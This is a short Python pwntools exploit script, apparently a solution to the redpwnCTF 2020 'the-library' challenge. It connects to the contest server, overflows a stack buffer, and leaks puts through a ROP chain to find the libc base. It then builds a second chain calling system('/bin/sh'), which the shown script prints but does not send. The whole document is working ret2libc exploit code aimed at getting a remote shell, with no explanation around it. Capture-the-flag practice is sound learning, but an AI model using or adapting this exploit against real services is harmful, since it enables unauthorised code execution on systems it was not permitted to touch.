from pwn import *
host,port="2020.redpwnc.tf",31350

context.log_level = 'error'

p = connect(host,port)
binary = ELF('./the-library')
libc = ELF('./libc.so.6')
JUNK = "A" * 24
main = binary.symbols['main']
got_puts = binary.got['puts']
plt_puts = binary.plt['puts']
pop_rdi = 0x400733


payload = JUNK
payload += p64(pop_rdi)
payload += p64(got_puts)
payload += p64(plt_puts)
payload += p64(main)

print(payload)
p.recvline()
p.sendline(payload)
p.recvline()
p.recvline()
leaked_puts = u64(p.recvline().strip().ljust(8, "\x00"))
libc_puts = libc.symbols['puts']
libc.address = leaked_puts - libc_puts
log.success("Leaked puts :  {}".format(hex(leaked_puts)))
log.success("Libc at  :  {}".format(hex(libc.address)))

libc_base=libc.address
payload = JUNK
payload += p64(pop_rdi)#pop_rdi
payload += p64(libc_base+0x1b3e9a) #libc_"bin/sh"
payload += p64(libc_base+0x04f440) #libc_system
payload += p64(libc_base+0x043120) #libc_exit
print(payload)
